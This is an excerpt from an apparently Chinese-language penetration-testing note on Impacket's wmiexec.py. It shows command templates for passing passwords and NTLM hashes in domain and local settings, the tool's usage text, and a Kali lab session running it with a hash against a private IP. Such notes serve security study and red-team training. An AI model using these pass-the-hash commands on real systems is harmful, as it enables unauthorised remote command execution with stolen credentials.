...
```shell
python3 wmiexec.py <domain>/<username>:<password>@<ip>
```

本地环境下传递密码

```shell
python3 wmiexec.py ./<username>:<password>@<ip>
```

域环境下传递Hash

```shell
python3 wmiexec.py -hashes :<hash> <domain>/<username>@<ip>
```

本地环境下传递Hash

```shell
python3 wmiexec.py -hashes :<hash> ./<username>@<ip>
```
...
usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-silentcommand] [-debug]
                  [-codec CODEC] [-shell-type {cmd,powershell}]
                  [-com-version MAJOR_VERSION:MINOR_VERSION] [-hashes LMHASH:NTHASH] [-no-pass]
                  [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB]
                  target [command [command ...]]

使用 Windows Management Instrumentation 执行半交互式 shell。
...
└─$ python3 wmiexec.py -hashes :579da618cfbfa85247acf1f800a280a4 administrator@192.168.36.130
...
```shell
┌──(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ python3 wmiexec.py -hashes :579da618cfbfa85247acf1f800a280a4 administrator@192.168.36.130 "whoami" 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
